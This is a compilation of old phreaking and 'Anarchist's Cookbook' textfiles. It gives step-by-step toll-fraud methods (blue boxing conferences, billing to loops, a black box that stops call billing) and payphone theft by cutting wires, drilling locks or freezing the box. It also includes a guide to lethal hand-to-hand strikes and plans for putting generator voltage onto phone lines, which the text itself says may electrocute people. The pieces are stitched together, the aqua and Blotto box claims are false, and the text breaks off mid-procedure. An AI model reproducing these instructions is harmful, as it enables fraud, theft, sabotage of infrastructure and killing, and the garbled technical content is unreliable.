The following procedure is how to box a conference:
Dial a number to box off of.  In this example we will use 609-609-6099
When the party answers hit 2600hz.  This will cause the fone company's
equipment to think that you have hung up.  You will hear a <beep><kerchunk>
You have now 'seized' a trunk.  After this, switch to multi-frequency
and dial:

KP-0-700-456-x00x-ST
KP=KP tone on Blue Box
x=variable between 1 and 3
ST=ST tone on Blue Box
The equipment now thinks that the operator has dialed Alliance from her
switchboard and the conference shall be billed there.  Since Blue Boxing
is such a large topic, this is as far as I will go into it's uses.

Billing to a loop:
------- -- - ----
A third method of receiving a free conference is by billing out to a
loop.  A loop is 2 numbers that when two people call, they can talk
to each other.  You're saying woop-tee-do right? Wrong! Loops can be
<very> usefull to phreaks.  First, dial alliance direct.  After going
through the beginning procedure, which will be discussed later in this
tutorial, dial 0 and wait for an Alliance operator.  When she answers
tell her you would like to bill the conference to such and such a
number. (A loop where your phriend is on the other side) She will then
call that number to receive voice verification.
Of course your phriend will be waiting and will accept the charges.
Thus, the conference is billed to the loop.

Billing to call forwarding:
------- -- ---- ----------
When you dial a number that is call forwarded, it is first answered by
the original location, then forwarded.  The original location will
hang up if 2600hz is received from only ond end of the line.
Therefore, if you were to wait after the forwarded residence answered,
you would receive the original location's dial tone.
    
     Example:
Dial 800-325-4067
The original residence would answer, then forward the call, a second 
type of ringing would be heard.  When this second residence answers
simply wait until they hang up.  After about twenty seconds you will
then receive the original residence's dial tone since it heard 2600hz
from one end of the line.  Simply dial Alliance from this point and the
conference will be billed to the original residence.
These are the four main ways to receive a free conference.  I am sure
many more exist, but these four are quite handy themselves.

Logon Procedure:
----- ---------
Once Alliance answers you will hear a two-tone combination.  This is their
way of saying 'How many people do you want on the conference dude?'
Simply type in a 2-digit combination, depending on what bridge of Alliance
you are on, between 10 and 59.  After this either hit '*' to cancel the
conference size and inout another or hit '#' to continue.
You are now in Alliance Teleconferencing and are only seconds away from
having your own roaring conference going strong!!!

Dialing in Conferees:
------- -- ---------
To dial your first conferee, dial 1+npa+pre+suff and await his/her answer.

npa=area code
pre=prefix
suff=suffix

If the number is busy, or if no one answers simply hit '*' and your call
will be aborted.  But, if they do answer, hit the '#' key.
This will add them to the conference.
Now commence dialing other conferees.

Joining Your Conference:
------- ---- ----------
To join your conference from control mode simply hit the '#' key. 
Within a second or two you will be chatting with all your buddies.
To go back into control mode, simply hit the '#' key again.

Transferring Control:
------------ -------
To transfer control to another conferee, go into control mode, hit the
# 6+1+npa+pre+suff of the conferee you wish to give control to. If after,
you wish to abort this transfer hit the '*' key.

<note>:Transfer of control is often not available.  When you
receive a message stating this, you simply cannot transfer control.

Muted Conferences:
----- -----------
To request a muted conference simply hit the 9 key.  I am not exactly
sure what a muted conference is but it is probably a way to keep unwanted
eavesdroppers from listening in.

Dialing Alliance Operators:
------- -------- ---------
Simply dial 0 as you would from any fone and wait for the operator to answer.

Ending Your Conference:
------ ---- ----------
To end your conference all together, that is kick everyone including
yourself off, go into control mode and hit '*'...after a few seconds
simply hang up.  Your conference is over.

Are Alliance Operators Dangerous?
--- -------- --------- ---------
No.  Not in the least.  The worst they can do to you while you are having
a conference is drop all conferees including yourself.  This is in no 
way harmful, just a little aggravating.

Alliance and Tracing:
-------- --- -------
Alliance can trace, as all citizens of the United States can. 
But this has to all be pre-meditated and AT&T has to be called and it's
really a large hastle, therefore, it is almost never done.  Alliance simply
does not want it known that teenagers are phucking them over. 
The only sort of safety equipment Alliance has on-line is a simple pen
register.  This little device simply records all the numbers of the
conferees dialed.  No big deal.  All Alliance can do is call up that persons
number, threaten and question.  However, legally, they can do nothing because
all you did was answer your fone.

<note>:Almost all instructions are told to the person in command by Alliance
recordings.  A lot of this tutorial is just a listing of those
commands plus information gathered by either myself or the phellow
phreaks of the world!!!

In the CookBook 4!   -= Mondain =-Aqua Box Plans                                            by Jolly Roger

Every true phreaker lives in fear of the dreadded F.B.I. 'Lock In Trace.'
For a long time, it was impossible to escape from the Lock In Trace.
This box does offer an escape route with simple directions to it.
This box is quite a simple concept, and almost any phreaker with basic
electronics knowledge can construct and use it.

The Lock In Trace
------------------
A lock in trace is a device used by the F.B.I. to lock into the phone
users location so that he can not hang up while a trace is in progress.
For those of you who are not familiar with the conecpt of 'locking in',
then here's a brief desciption. The F.B.I. can tap into a conversation,
sort of like a three-way call connection. Then, when they get there,
they can plug electricity into the phone line. All phone connections
are held open by a certain voltage of electricity.
That is why you sometimes get static and faint connections when you are
calling far away, because the electricity has trouble keeping the line
up. What the lock in trace does is cut into the line and generate that same
voltage straight into the lines. That way, when you try and hang up, voltage
is retained. Your phone will ring just like someone was calling you
even after you hang up. (If you have call waiting, you should understand
better about that, for call waiting intersepts the electricity and makes
a tone that means someone is going through your line. Then, it is a matter
of which voltage is higher. When you push down the receiver,then it see-saws
the electricity to the other side. When you have a person on each line
it is impossible to hang up unless one or both of them will hang up.
If you try to hang up, voltage is retained, and your phone will ring.
That should give you an understanding of how calling works. Also, when
electricity passes through a certain point on your phone, the electricity
causes a bell to ring, or on some newer phones an electronic ring to sound.)
So, in order to eliminate the trace, you somehow must lower the
voltage level on your phone line. You should know that every time
someone else picks up the phone line, then the voltage does decrease
a little. In the first steps of planning this out, Xerox suggested getting
about a hundred phones all hooked into the same line that could all
be taken off the hook at the same time. That would greatly decrease the
voltage level. That is also why most three-way connections that are using
the bell service three way calling (which is only $3 a month) become quite
faint after a while. By now, you should understand the basic idea. You
have to drain all of the power out of the line so the voltage can
not be kept up. Rather sudden draining of power could quickly short out
the F.B.I. voltage machine, because it was only built to sustain
the exact voltage nessecary to keep the voltage out. For now, imagine
this. One of the normal Radio Shack generators that you can go
pick up that one end of the cord that hooks into the central box has a 
phone jack on it and the other has an electrical plug. This way, you
can "flash" voltage through the line, but cannot drain it. So, some
modifications have to be done.

Materials
----------
A BEOC (Basic Electrical Output Socket), like a small lamp-type
connection, where you just have a simple plug and wire that would plug
into a light bulb.
One of cords mentioned above, if you can't find one then construct your
own... Same voltage connection, but the restrainor must be built in (I.E.
The central box)
Two phone jacks (one for the modem, one for if you are being traced to
plug the aqua box into)
Some creativity and easy work.

*Notice: No phones have to be destroyed/modified to make this box, so
don't go out and buy a new phone for it!

Procedure
---------
All right, this is a very simple procedure. If you have the BEOC, it could
drain into anything: a radio, or whatever. The purpose of having
that is you are going to suck the voltage out from the phone line into
the electrical appliance so there would be no voltage left to lock
you in with.
1)Take the connection cord. Examine the plug at the end. It should have
only two prongs. If it has three, still, do not fear. Make sure the
electrical appliance is turned off unless you wanna become a crispy critter
while making this thing. Most plugs will have a hard plastic design on the
top of them to prevent you from getting in at the electrical wires inside.
Well, remove it. If you want to keep the plug (I don't see why...)
then just cut the top off. When you look inside, Lo and Behold,
you will see that at the base of the prongs there are a few wires
connecting in. Those wires conduct the power into the appliance.
So, you carefully unwrap those from the sides and pull them out until
they are about an inch ahead of the prongs. If you don't wanna keep the
jack, then just rip the prongs out. If you are, cover the prongs with
insultation tape so they will not connect with the wires when the power
is being drained from the line.
2)Do the same thing with the prongs on the other plug, so you have the
wires evenly connected. Now, wrap the end of the wires around each other.
If you happen to have the other end of the voltage cord hooked into the
phone, stop reading now, you're too fucking stupid to continue. After
you've wrapped the wires around each other, then cover the whole thing with
the plugs with insulating tape. Then, if you built your own control box
or if you bought one, then cram all the wires into it and reclose it.
That box is your ticket out of this.
3)Re-check everything to make sure it's all in place. This is a pretty
flimsy connection, but on later models when you get more experienced at
it then you can solder away at it and form the whole device into one
big box, with some kind of cheap mattel hand-held game inside to be
the power connector.  In order to use it, just keep this box handy.
Plug it into the jack if you want, but it will slightly lower the
voltage so it isn't connected. When you plug it in, if you see sparks,
unplug it and restart the whole thing. But if it just seems fine then leave it.

Use
----
Now, so you have the whole thing plugged in and all... Do not use this
unless the situation is desperate! When the trace has gone on, don't
panic, unplug your phone, and turn on the appliance that it was hooked
to. It will need energy to turn itself on, and here's a great source...
The voltage to keep a phone line open is pretty small and a simple light
bulb should drain it all in and probably short the F.B.I. computer at
the same time.

Happy boxing and stay free!               ------------Mondain

            AN EXCERPT FROM THE ANARCHISTS COOKBOOK II.....
                         Courtesy of Mondain

This file will explain the basics of hand-to-hand combat, and will tell
of the best places to strike and kill an enemy...
When engaged in hand-to-hand combat, your life is always at stake.
There is only one purpose in combat, and that is to kill your enemy.
Never face an enemy with the idea of knocking him out.
The chances are extremely good that he will kill YOU instead.
When a weapon is not available, one must resort to the full
use of his natural weapons. The natural weapons are:

1. The knife edge of your hands.
2. Fingers folded at the second joint or knuckle.
3. The protruding knuckle of your second finger.
4. The heel of your hand.
5. Your boot
6. Elbows
7. Knees
8. and Teeth.

Attacking is a primary factor. A fight was never 
won by defensive action. Attack with all of your strength.
At any point or any situation, some vulnerable point on your enemies
body will be open for attack. Do this while screaming as screaming has
two purposes.

1. To frighten and confuse your enemy.
2. To allow you to take a deep breath which, in turn, will put
more oxygen in your blood stream. Your balance and balance of your
enemy are two inportant factors; since, if you succeed in making
your enemy lose his balance, the chances are nine to
one that you can kill him in your next move. The best over-all
stance is where your feet are spread about shoulders width apart, 
with your right foot about a foot ahead of the left. Both arms
should be bent at the elbows parallel to each other. Stand on the
balls of your feet and bend your waist slightly. Kinda of like a
boxer's crouch. Employing a sudden movement or a scream or yell can
throw your enemy off-balance. There are many vulnerable points of
the body. We will cover them now:

Eyes:Use your fingers in a V-shape and attack in gouging motion.

Nose:(Extremely vulnerable) Strike with the knife edge of the hand
along the bridge, which will cause breakage, sharp pain, temporary
blindness, and if the blow is hard enough, death. Also, deliver a blow 
with the heel of your hand in an upward motion, thiswill shove the
bone up into the brain causing death.

Adam's Apple: This spot is usually pretty well protected, but if you
get the chance, strike hard with the knife edge of your hand. This
should sever the wind-pipe, and then it's all over in a matter of
minutes.

Temple: There is a large artery up here, and if you hit it hard
enough, it will cause death. If you manage to knock your enemy down,
kick him in the temple, and he'll never get up again.

Back of the Neck: A rabbit punch, or blow delivered to the base of
the neck can easily break it, but to be safe, it is better to
use the butt of a gun or some other heavy blunt object.
Upper lip: A large network of nerves are located. These nerves are
extrememly close to the skin. A sharp upward blow will cause extreme
pain, and unconciosness.

Ears: Coming up from behind an enemy and cupping the hands in a clapping
motion over the victims ears can kill him immediately. The vibrations
caused from the clapping motion will burst his eardrums, and cause 
internal bleeding in the brain.

Groin: A VERY vulnerable spot. If left open, get it with knee
hard, and he'll buckle over very fast.

Kidneys: A large nerve that branches off to the spinal cord comes very
close to the skin at the kidneys. A direct blow with the knife edge
of your hand can cause death.

There are many more ways to kill and injure an enemy, but these should
work best for the average person. This is meant only as information
and I would not recommend that you use this for a simple High School Brawl.
Use these methods only, in your opinion, if your life is in danger.
Any one of these methods could very easily kill or cause permanent damage
to someone. One more word of caution, you should practice these moves
before using them on a dummy, or a mock battle with a friend.
(You don't have to actually hit him to practice, just work on accuracy.)


Phone Systems Tutorial III                      by The Jolly Roger

PREFACE:

THIS ARTICLE WILL FOCUS PRIMARILY ON THE STANDARD WESTERN ELECTRIC SINGLE-
SLOT COIN TELEPHONE (AKA FORTRESS FONE) WHICH CAN BE DIVIDED INTO 3 TYPES:
- DIAL-TONE FIRST (DTF)
- COIN-FIRST (CF):  (IE, IT WANTS YOUR $ BEFORE YOU RECEIVE A DIAL TONE)
- DIAL POST-PAY SERVICE (PP):  YOU PAYAFTER THE PARTY ANSWERS

DEPOSITING COINS (SLUGS):
-------------------------
ONCE YOU HAVE DEPOSITED YOUR SLUG INTO A FORTRESS, IT IS SUBJECTED TO A
GAMUT OF TESTS. THE FIRST OBSTACAL FOR A SLUG IS THE
MAGNETIC TRAP.  THIS WILL STOP ANY LIGHT-WEIGHT MAGNETIC SLUGS AND COINS.
IF IT PASSES THIS, THE SLUG IS THEN CLASSIFIED AS A NICKEL, DIME, OR
QUARTER.  EACH SLUG IS THEN CHECKED FOR APPROPRIATE SIZE AND WEIGHT.  IF THESE
TESTS ARE PASSED, IT WILL THEN TRAVEL THROUGH A NICKEL, DIME, OR QUARTER
MAGNET AS APPROPRIATE.  THESE MAGNETS SET UP AN EDDY CURRENT EFFECT WHICH
CAUSES COINS OF THE APPROPRIATE CHARACTERISTICS TO SLOW DOWN SO THEY
WILL FOLLOW THE CORRECT TRAJECTORY.  IF ALL GOES WELL, THE COIN WILL FOLLOW THE
CORRECT PATH (SUCH AS BOUNCING OFF OF THE NICKEL ANVIL) WHERE IT WILL
HOPEFULLY FALL INTO THE NARROW ACCEPTED COIN CHANNEL.
THE RATHER ELABORATE TESTS THAT ARE PERFORMED AS THE COIN TRAVELS DOWN THE
COIN CHUTE WILL STOP MOST SLUGS AND OTHER UNDESIRABLE COINS, SUCH AS
PENNIES, WHICH MUST THEN BE RETRIEVED USING THE COIN RELEASE LEVER.
IF THE SLUG MIRACULOUSLY SURVIVES THE GAMUT, IT WILL THEN STRIKE THE
APPROPRIATE TOTALIZER ARM CAUSING A RATCHET WHEEL TO ROTATE ONCE FOR EVERY
5-CENT INCREMENT (EG, A QUARTER WILL CAUSE IT TO ROTATE 5 TIMES).
THE TOTALIZER THEN CAUSES THE COIN SIGNAL OSCILLATOR TO READOUT A DUAL-
FREQUENCY SIGNAL INDICATING THE VALUE DEPOSITED TO ACTS (A COMPUTER) OR THE
TSPS OPERATOR. THESE ARE THE SAME TONES USED BY PHREAKS IN THE INFAMOUS RED
BOXES. FOR A QUARTER, 5 BEEP TONES ARE
OUTPULSED AT 12-17 PULSES PER SECOND (PPS).  A DIME CAUSES 2 BEEP TONES AT
5 - 8.5 PPS WHILE A NICKEL CAUSES ONE BEEP TONE AT 5 - 8.5 PPS.  A BEEP
CONSISTS OF 2 TONES:  2200 + 1700 HZ. A RELAY IN THE FORTRESS CALLED THE "B
RELAY" (YES, THERE IS ALSO AN 'A RELAY') PLACES A CAPACITOR ACROSS THE
SPEECH CIRCUIT DURING TOTALIZER READOUT TO PREVENT THE "CUSTOMER" FROM
HEARING THE RED BOX TONES. IN OLDER 3 SLOT PHONES:  ONE BELL
(1050-1100 HZ) FOR A NICKEL, TWO BELLS FOR A DIME, AND ONE GONG (800 HZ) FOR A
QUARTER ARE USED INSTEAD OF THE MODERN DUAL-FREQUENCY TONES.

=============
=TSPS & ACTS=
=============

WHILE FORTRESSES ARE CONNECTED TO THE CO OF THE AREA, ALL TRANSACTIONS ARE
HANDLED VIA THE TRAFFIC SERVICE POSITION SYSTEM (TSPS).  IN AREAS THAT
DO NOT HAVE ACTS, ALL CALLS THAT REQUIRE OPERATOR ASSISTANCE, SUCH AS
CALLING CARD AND COLLECT, ARE AUTOMATICALLY ROUTED TO A TSPS OPERATOR
POSITION. IN AN EFFORT TO AUTOMATE FORTRESS
SERVICE, A COMPUTER SYSTEM KNOWN AS AUTOMATED COIN TOLL SERVICE (ACTS) HAS
BEEN IMPLEMENTED IN MANY AREAS.  ACTS LISTENS TO THE RED BOX SIGNALS FROM THE
FONES AND TAKES APPROPRIATE ACTION.  IT IS ACTS WHICH SAYS, "TWO DOLLARS PLEASE
(PAUSE) PLEASE DEPOSIT TWO DOLLARS FOR THE NEXT TEN SECONDS" (AND OTHER
VARIATIONS). ALSO, IF YOU TALK FOR MORE THAN THREE MINUTES AND THEN HANG-UP,
ACTS WILL CALL BACK AND DEMAND YOUR MONEY.  ACTS IS ALSO RESPONSIBLE FOR
AUTOMATED CALLING CARD SERVICE. ACTS ALSO PROVIDE TROUBLE DIAGNOSIS FOR
CRAFTSPEOPLE (REPAIRMEN SPECIALIZING IN FORTRESSES).  FOR EXAMPLE, THERE IS A
COIN TEST WHICH IS GREAT FOR TUNING UP RED BOXES.  IN MANY AREAS THIS TEST CAN
BE ACTIVATED BY DIALING 09591230 AT A FORTRESS (THANKS TO KARL MARX FOR THIS
INFORMATION).  ONCE ACTIVATED IT WILL REQUEST THAT YOU DEPOSIT VARIOUS COINS.
IT WILL THEN IDENTIFY THE COIN AND OUTPULSE THE APPROPRIATE RED BOX
SIGNAL.  THE COINS ARE USUALLY RETURNED WHEN YOU HANG UP.
TO MAKE SURE THAT THERE IS ACTUALLY MONEY IN THE FONE, THE CO INITIATES A
"GROUND TEST" AT VARIOUS TIMES TO DETERMINE IF A COIN IS ACTUALLY IN THE
FONE.  THIS IS WHY YOU MUST DEPOSIT AT LEAST A NICKEL IN ORDER TO USE A RED
BOX!

GREEN BOXES:
------------

PAYING THE INITIAL RATE IN ORDER TO USE A RED BOX (ON CERTAIN FORTRESSES)
LEFT A SOUR TASTE IN MANY RED BOXER'S MOUTHS THUS THE GREEN BOX WAS INVENTED.
THE GREEN BOX GENERATES USEFUL TONES SUCH AS COIN COLLECT, COIN RETURN, AND
RINGBACK.  THESE ARE THE TONES THAT ACTS OR THE TSPS OPERATOR WOULD SEND TO
THE CO WHEN APPROPRIATE. UNFORTUNATELY, THE GREEN BOX CANNOT BE USED AT A
FORTRESS STATION BUT IT MUST BE USED BY THE CALLED PARTY.

HERE ARE THE TONES:
     COIN COLLECT       700 + 1100 HZ
     COIN RETURN       1100 + 1700 HZ
     RINGBACK           700 + 1700 HZ
BEFORE THE CALLED PARTY SENDS ANY OF THESE TONES, AN OPERATOR RELEASED
SIGNAL SHOULD BE SENT TO ALERT THE MF DETECTORS AT THE CO.  THIS CAN BE
ACCOMPLISHED BY SENDING 900 + 1500 HZ OR A SINGLE 2600 HZ WINK (90 MS)
FOLLOWED BY A 60 MS GAP AND THEN THE APPROPRIATE SIGNAL FOR AT LEAST 900 MS.
ALSO, DO NOT FORGET THAT THE INITIAL RATE IS COLLECTED SHORTLY BEFORE THE 3
MINUTE PERIOD IS UP. INCIDENTALLY, ONCE THE ABOVE MF TONES
FOR COLLECTING AND RETURNING COINS REACH THE CO, THEY ARE CONVERTED INTO
AN APPROPRIATE DC PULSE (-130 VOLTS FOR RETURN & +130 VOLTS FOR COLLECT). THIS
PULSE IS THEN SENT DOWN THE TIP TO THE FORTRESS.  THIS CAUSES THE COIN RELAY
TO EITHER RETURN OR COLLECT THE COINS. THE ALLEGED "T-NETWORK" TAKES ADVANTAGE
OF THIS INFORMATION.  WHEN A PULSE FOR COIN COLLECT (+130 VDC) IS SENT DOWN
THE LINE, IT MUST BE GROUNDED SOMEWHERE.  THIS IS USUALLY EITHER THE
YELLOW OR BLACK WIRE.  THUS, IF THE WIRES ARE EXPOSED, THESE WIRES CAN BE
CUT TO PREVENT THE PULSE FROM BEING GROUNDED.  WHEN THE THREE MINUTE
INITIAL PERIOD IS ALMOST UP, MAKE SURE THAT THE BLACK & YELLOW WIRES ARE
SEVERED; THEN HANG UP, WAIT ABOUT 15 SECONDS IN CASE OF A SECOND PULSE,
RECONNECT THE WIRES, PICK UP THE FONE, HANG UP AGAIN, AND IF ALL GOES WELL IT
SHOULD BE "JACKPOT" TIME.

PHYSICAL ATTACK:
----------------

A TYPICAL FORTRESS WEIGHS ROUGHLY 50 LBS. WITH AN EMPTY COIN BOX.  MOST OF
THIS IS ACCOUNTED FOR IN THE ARMOR PLATING.  WHY ALL THE SECURITY?  WELL,
BELL CONTRIBUTES IT TO THE FOLLOWING: "SOCIAL CHANGES DURING THE 1960'S
MADE THE MULTISLOT COIN STATION A PRIME TARGET FOR:  VANDALISM, STRONG ARM
ROBBERY, FRAUD, AND THEFT OF SERVICE. THIS BROUGHT ABOUT THE INTRODUCTION OF
THE MORE RUGGED SINGLE SLOT COIN  STATION AND A NEW ENVIRONMENT FOR COIN
SERVICE." AS FOR PICKING THE LOCK, I WILL QUOTE MR. PHELPS:
"WE OFTEN FANTASIZE ABOUT 'PICKING THE LOCK' OR 'GETTING A MASTER
KEY.'  WELL, YOU CAN FORGET ABOUT IT. I DON'T LIKE TO DISCOURAGE PEOPLE, BUT
IT WILL SAVE YOU FROM WASTING ALOT OF OUR TIME--TIME WHICH CAN BE PUT TO
BETTER USE (HEH, HEH)." AS FOR PHYSICAL ATTACK, THE COIN PLATE
IS SECURED ON ALL FOUR SIDE BY HARDENED STEEL BOLTS WHICH PASS THROUGH TWO
SLOTS EACH.  THESE BOLTS ARE IN TURN INTERLOCKED BY THE MAIN LOCK.
ONE PHREAK I KNOW DID MANAGE TO TAKE ONE OF THE 'MOTHERS' HOME (WHICH WAS
ATTACHED TO A PIECE OF PLYWOOD AT A CONSTRUCTION SITE; OTHERWISE, THE
PERMANENT ONES ARE A BITCH TO DETACH FROM THE WALL!).  IT TOOK HIM ALMOST
TEN HOURS TO OPEN THE COIN BOX USING A POWER DRILL, SLEDGE HAMMERS, AND CROW
BARS (WHICH WAS EMPTY -- PERHAPS NEXT TIME, HE WILL DEPOSIT A COIN FIRST TO
HEAR IF IT SLUSHES DOWN NICELY OR HITS THE EMPTY BOTTOM WITH A CLUNK.)
TAKING THE FONE OFFERS A HIGHER MARGIN OF SUCCESS.  ALTHOUGH THIS MAY BE
DIFFICULT OFTEN REQUIRING BRUTE FORCE AND THERE HAS BEEN SEVERAL CASES OF
BACK AXLES BEING LOST TRYING TO TAKE DOWN A FONE!  A QUICK AND DIRTY WAY TO
OPEN THE COIN BOX IS BY USING A SHOTGUN.  IN DETROIT, AFTER ECOLOGISTS
CLEANED OUT A MUNICIPAL POND, THEY FOUND 168 COIN PHONE RIFLED.
IN COLDER AREAS, SUCH AS CANADA, SOME SHREWD PEOPLE TAPE UP THE FONES USING
DUCT TAPE, POUR IN WATER, AND COME BACK THE NEXT DAY WHEN THE WATER WILL HAVE
FROZE THUS EXPANDING AND CRACKING THE FONE OPEN.
IN ONE CASE, "UNAUTHORIZED COIN COLLECTORS" WHERE CAUGHT WHEN THEY
BROUGHT $6,000 IN CHANGE TO A BANK AND THE BANK BECAME SUSPICIOUS...
AT ANY RATE, THE MAIN LOCK IS AN EIGHT LEVEL TUMBLER LOCATED ON THE RIGHT SIDE
OF THE COIN BOX.  THIS LOCK HAS 390,625 POSSIBLE POSITIONS (5 ^ 8, SINCE THERE
ARE 8 TUMBLERS EACH WITH 5 POSSIBLE POSITIONS) THUS IT IS HIGHLY PICK
RESISTANT!  THE LOCK IS HELD IN PLACE BY 4 SCREWS.  IF THERE IS SUFFICIENT
CLEARANCE TO THE RIGHT OF THE FONE, IT IS CONCEIVABLE TO PUNCH OUT THE SCREWS
USING THE DRILLING PATTERN BELOW (PROVIDED BY ALEXANDER MUNDY IN TAP #32):

====================================
                       !!        ^
                       !!        !

        (Z) KEYHOLE   (+) SCREWS
                       !!
===================================

AFTER THIS IS ACCOMPLISHED, THE LOCK CAN BE PUSHED BACKWARDS DISENGAGING
THE LOCK FROM THE COVER PLATE.  THE FOUR BOLTS OF THE COVER PLATE CAN THEN
BE RETRACTED BY TURNING THE BOLTWORKS WITH A SIMPLE KEY IN THE SHAPE OF THE
HOLE ON THE COIN PLATE (SEE DIAGRAM BELOW).  OF COURSE, THERE ARE OTHER
METHODS AND DRILLING PATTERNS.

               [ROUGHLY]
    DIAGRAM OF COVER PLATE KEYHOLE
:-------------------------------------:

THE TOP COVER USES A SIMILAR (BUT NOT AS STRONG) LOCKING METHOD WITH THE
KEYHOLE DEPICTED ABOVE ON THE TOP LEFT HIDE AND A REGULAR LOCK (PROBABLY
TUMBLER ALSO) ON THE TOP RIGHT-HAND SIDE. IT IS INTERESTING TO EXPERIMENT
WITH THE COIN SHUTE AND THE FORTRESSES OWN "RED BOX" (WHICH BELL DIDN'T HAVE
THE 'BALLS' TO COLOR RED).

MISCELLANEOUS:
--------------

IN A FEW AREAS (RURAL & CANADA), POST-PAY SERVICE EXISTS.  WITH THIS TYPE OF
SERVICE, THE MOUTHPIECE IS CUT OFF UNTIL THE CALLER DEPOSITS MONEY WHEN
THE CALLED PARTY ANSWERS.  THIS ALSO ALLOWS FOR FREE CALLS TO WEATHER AND
OTHER DIAL-IT SERVICES!  RECENTLY, 2600 MAGAZINE ANNOUNCED THE CLEAR BOX WHICH
CONSISTS OF A TELEPHONE PICKUP COIL AND A SMALL AMP.  IT IS BASED ON THE
RINCIPAL THAT THE RECEIVER IS ALSO A WEAK TRANSMITTER AND THAT BY AMPLIFYING
YOUR SIGNAL YOU CAN TALK VIA THE TRANSMITTER THUS AVOIDING COSTLY
TELEPHONE CHARGES! MOST FORTRESSES ARE FOUND IN THE 9XXX
AREA.  UNDER FORMER BELL AREAS, THEY USUALLY START AT 98XX (RIGHT BELOW THE
99XX OFFICIAL SERIES) AND MOVE DOWNWARD.
SINCE THE LINE, NOT THE FONE, DETERMINES WHETHER OR NOT A DEPOSIT
MUST BE MADE, DTF & CHARGE-A-CALL FONES MAKE GREAT EXTENSIONS!
FINALLY, FORTRESS FONES ALLOW FOR A NEW HOBBY--INSTRUCTION PLATE COLLECTING.
ALL THAT IS REQUIRED IS A FLAT-HEAD SCREWDRIVER AND A PAIR OF NEEDLE-NOSE
PLIERS.  SIMPLY USE THE SCREWDRIVER TO LIFT UNDERNEATH THE PLATE SO THAT YOU
CAN GRAB IT WITH THE PLIERS AND YANK DOWNWARDS. I WOULD SUGGEST COVERING THE
TIPS OF THE PLIERS WITH ELECTRICAL TAPE TO PREVENT SCRATCHING.  TEN CENT PLATES
ARE DEFINITELY BECOMING A "RARITY!"

FORTRESS SECURITY:
------------------

WHILE A LONELY FORTRESS MAY SEEM THE PERFECT TARGET, BEWARE!  THE GESTAPO
HAS BEEN KNOWN TO STAKE OUT FORTRESSES FOR AS LONG AS 6 YEARS ACCORDING TO THE
GRASS ROOTS QUARTERLY.  TO AVOID ANY PROBLEMS, DO NOT USE THE SAME FONES
REPEATEDLY FOR BOXING, CALLING CARDS, & OTHER EXPERIMENTS.  THE TELCO KNOWS HOW
MUCH MONEY SHOULD BE IN THE COIN BOX AND WHEN ITS NOT THERE THEY TEND TO GET
PERTURBED (READ:  PISSED OFF).

Black Box Plans                                 by The Jolly Roger

Introduction:
------------
At any given time, the voltage running through your phone is about 20
Volts. When someone calls you, this voltage goes up to 48 Volts and rings
the bell. When you answer, the voltage goes down to about 10 Volts.
The phone company pays attention to this. When the voltage drops to 10,
they start billing the person who called you.

Function:
--------
The Black Box keeps the voltage going through your phone at 36 Volts,
so that it never reaches 10 Volts. The phone company is thus fooled
into thinking you never answered the phone and does not bill the caller.
However, after about a half hour the phone company will get suspicious
and disconnect your line for about 10 seconds.

Materials:
---------
1 1.8K 1/2 Watt Resistor
1 1.5V LED
1 SPST Switch

Procedure:
---------
(1) Open your phone by loosening the two screws on the bottom and
lifting the case off.
(2) There should be three wires: Red, Green, and Yellow. We'll be working
with the Red Wire.
(3) Connect the following in parallel:
     A. The Resistor and LED.
     B. The SPST Switch.
In other words, you should end up with this:
              (Red Wire)
           !---/\/\/\--O--!
(Line)-----!              !-----(Phone)
           !-----_/_------!
          /\/\/\ = Resistor
          O      = LED
          _/_    = SPST

Use:
---
The SPST Switch is the On/Off Switch of the Black Box. When the box is off,
your phone behaves normally. When the box is on and your phone rings,
the LED flashes. When you answer, the LED stays on and the voltage
is kept at 36V, so the calling party doesn't get charged. When the box
is on, you will not get a dial tone and thus cannot make calls.
Also remember that calls are limited to half an hour.

                                      ------------Mondain

p.s. Due to new Fone Company switching systems & the like, this 
may or may not work in your area. If you live in bumfuck Kentucky, 
then try this out. I make no guarantees! (I never do...) ----MDN.


The Infamous Blotto Box!!                       by The Jolly Roger
      
        (I bet that NO ONE has the balls to build this one!)

Finally, it is here! What was first conceived as a joke to fool the innocent
phreakers around America has finally been conceived!
Well, for you people who are unenlightened about the Blotto Box,
here is a brief summery of a legend.

--*-=> The Blotto Box <=-*--

For years now every pirate has dreamed of the Blotto Box. It was at first
made as a joke to mock more ignorant people into thinking that
the function of it actually was possible. Well, if you are The Voltage
Master, it is possible. Originally conceived by King Blotto of much fame,
the Blotto Box is finally available to the public.
NOTE: Jolly Roger can not be responsible for the information disclosed
in the file! This file is strictly for informational purposes and
should not be actually built and used! Usage of this electronical impulse
machine could have the severe results listed below and could result in
high federal prosecution! Again, I TAKE NO RESPONSIBILITY!
All right, now that that is cleared up, here is the basis of the box
and it's function.
The Blotto Box is every phreaks dream... you could hold AT&T down on its
knee's with this device. Because, quite simply, it can turn off the phone
lines everywhere. Nothing. Blotto. No calls will be allowed out of an area
code, and no calls will be allowed in. No calls can be made inside it for
that matter. As long as the switching system stays the same, this box will
not stop at a mere area code. It will stop at nothing. The electrical
impulses that emit from this box will open every line. Every line will
ring and ring and ring... the voltage will never be cut off until the
box/generator is stopped. This is no 200 volt job, here.
We are talking GENERATOR. Every phone line will continue to ring, and people
close to the box may be electricuted if they pick up the phone.
But, the Blotto Box can be stopped by merely cutting of the line or generator.
If they are cut off then nothing will emit any longer. It will take
a while for the box to calm back down again, but that is merely a
superficial aftereffect. Once again: Construction and use of this box is
not advised! The Blotto Box will continue as long as there is
electricity to continue with.
OK, that is what it does, now, here are some interesting things for you
to do with it...

-*-=>Blotto Functions/Installin'<=-*-

Once you have installed your Blotto, there is no turning back. The
following are the instructions for construction and use of this box.
Please read and heed all warnings in the above section before you attempt
to construct this box.

Materials:
  - A Honda portable generator or a main power outlet like in a 
    stadium or some such place.
  - 400 volt rated coupler that splices a female plug into a
    phone line jack.
  - A meter of voltage to attach to the box itself.
  - A green base (i.e. one of the nice boxes about 3' by 4' that
    you see around in your neighborhood. They are the main switch
    boards and would be a more effective line to start with.
    or: A regular phone jack (not your own, and not in your area
    code!
  - A soldering iron and much solder.
  - A remote control or long wooden pole.
Now. You must have guessed the construction from that. If not, here goes,
I will explain in detail. Take the Honda Portable Generator and all of
the other listed equiptment and go out and hunt for a green base. Make
sure it is one on the ground or hanging at head level from a pole,
not the huge ones at the top of telephone poles. Open it up with anything
convienent, if you are two feeble that fuck don't try this.
Take a look inside... you are hunting for color-coordinating lines of
green and red. Now, take out your radio shack cord and rip the meter thing
off. Replace it with the voltage meter about. A good level to set the
voltage to is about 1000 volts. Now, attach the voltage meter to the cord
